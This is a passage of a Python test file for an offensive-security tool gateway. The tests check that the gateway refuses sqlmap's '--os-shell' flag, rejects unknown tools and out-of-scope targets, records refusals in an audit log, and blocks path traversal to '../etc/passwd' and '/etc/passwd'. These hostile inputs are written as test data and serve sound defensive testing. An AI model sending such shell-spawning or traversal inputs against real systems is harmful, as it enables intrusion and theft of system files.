    response = await ws.client.post(
        "/api/v1/offensive/tools/run",
        headers=ws.headers["owner"],
        json={
            "engagement_id": ENG,
            "tool": "sqlmap",
            "target": "127.0.0.1",
            "flags": ["--os-shell"],
        },
    )
    assert response.status_code == 422
    assert "refused" in response.json()["detail"].lower()


async def test_unknown_tool_is_rejected(ws):
    response = await ws.client.post(
        "/api/v1/offensive/tools/run",
        headers=ws.headers["owner"],
        json={"engagement_id": ENG, "tool": "not-a-tool", "target": "127.0.0.1"},
    )
    assert response.status_code == 422


async def test_audit_ledger_covers_offensive_refusals(ws):
    await ws.client.post(
        "/api/v1/offensive/tools/run",
        headers=ws.headers["owner"],
        json={"engagement_id": ENG, "tool": "nmap", "target": "203.0.113.99"},
    )
    with ws.db.connection() as conn:
        rows = conn.execute(
            "SELECT tool_or_script, status FROM audit_log WHERE status='rejected'"
        ).fetchall()
    assert any(r["tool_or_script"].startswith("offensive:") for r in rows)


def test_healthz_lists_the_new_features(ws):
    from gateway.main import create_app  # noqa: F401 - imported for parity

    # The runtime is already built by the fixture; assert on the feature map the
    # health endpoint composes.
    assert ws.rt.pwntools.availability()["available"] in (True, False)
    assert len(ws.rt.loops.roster()["roles"]) == 70
    assert ws.rt.policies.posture(ENG).policy_id == "posture:permissive_in_scope"


# ---------------------------------------------------------------------------
# Artifact-rooted binary tools (a different target concept)
# ---------------------------------------------------------------------------
def test_binary_tools_take_artifacts_not_hosts():
    from mcp_server.catalog import takes_artifact

    assert takes_artifact(get_entry("readelf")) is True
    assert takes_artifact(get_entry("nmap")) is False
    with pytest.raises(ArgvBuildError, match="artifact root"):
        build_argv("readelf", "../../etc/passwd", flags=["-h"], allowed_flags=["-h"])
    with pytest.raises(ArgvBuildError, match="artifact root"):
        build_argv("readelf", "sub/dir/binary", flags=["-h"], allowed_flags=["-h"])
    assert build_argv("readelf", "vuln.elf", flags=["-h"], allowed_flags=["-h"]) == [
        "readelf", "-h", "vuln.elf",
    ]


def test_a_host_name_is_not_treated_as_a_binary_artifact(ws):
    """'read the hardening flags of 127.0.0.1' is a category error, not a scope question.

    Asserted at the runner, below the MCP bridge, so the test does not depend on a
    reachable tool service.
    """
    _operator_consent(ws)
    result = _run(
        ws.rt.runner.run(
            principal=ws.owner,
            engagement_id=ENG,
            tool="readelf",
            target="127.0.0.1",
            flags=["-h"],
        )
    )
    # It must not succeed as if a host were a file, and the refusal must not be
    # phrased as a scope violation — readelf never touches the network.
    assert result.status in {"unavailable", "failed"}
    assert result.exit_code != 0
    assert "allowlist" not in (result.stderr or "").lower()


async def test_artifact_traversal_is_refused_by_the_runner(ws):
    _operator_consent(ws)
    response = await ws.client.post(
        "/api/v1/offensive/tools/run",
        headers=ws.headers["owner"],
        json={"engagement_id": ENG, "tool": "readelf", "target": "../etc/passwd", "flags": ["-h"]},
    )
    assert response.status_code == 422


def test_artifact_root_resolution_is_contained(tmp_path):
    """The executor resolves names under an explicit root, never the process cwd."""
    from mcp_server.executor import MCPToolExecutor

    root = tmp_path / "artifacts"
    root.mkdir()
    artifact = root / "vuln.elf"
    artifact.write_bytes(b"\x7fELF\x02\x01\x01" + b"\x00" * 600)
    (tmp_path / "outside.elf").write_bytes(b"\x7fELF")

    ex = MCPToolExecutor(artifact_root=str(root))

    ok = _run(
        ex.execute(
            tool_name="readelf",
            target="vuln.elf",
            params={"flags": ["-h"]},
            allowed_params_policy={"allowed_flags": ["-h"]},
        )
    )
    if ok.exit_code == 0:
        assert "ELF Header" in ok.stdout
    else:  # readelf absent from the image
        assert ok.exit_code == 127

    missing = _run(
        ex.execute(
            tool_name="readelf",
            target="absent.elf",
            params={"flags": ["-h"]},
            allowed_params_policy={"allowed_flags": ["-h"]},
        )
    )
    assert missing.exit_code == 127
    assert "not found" in (missing.stderr or "")

    for escape in ("../outside.elf", "/etc/passwd", "sub/../vuln.elf"):
        with pytest.raises(Exception):
            _run(
                ex.execute(
                    tool_name="readelf",
                    target=escape,
                    params={"flags": ["-h"]},
                    allowed_params_policy={"allowed_flags": ["-h"]},
                )
            )


def test_executor_without_artifact_root_refuses_rather_than_guessing():
    from mcp_server.executor import MCPToolExecutor

    ex = MCPToolExecutor(artifact_root="")
    with pytest.raises(Exception, match="REDGATE_ARTIFACT_DIR|artifact root"):
        _run(
            ex.execute(
                tool_name="readelf",
                target="vuln.elf",
                params={"flags": ["-h"]},
                allowed_params_policy={"allowed_flags": ["-h"]},
            )
        )
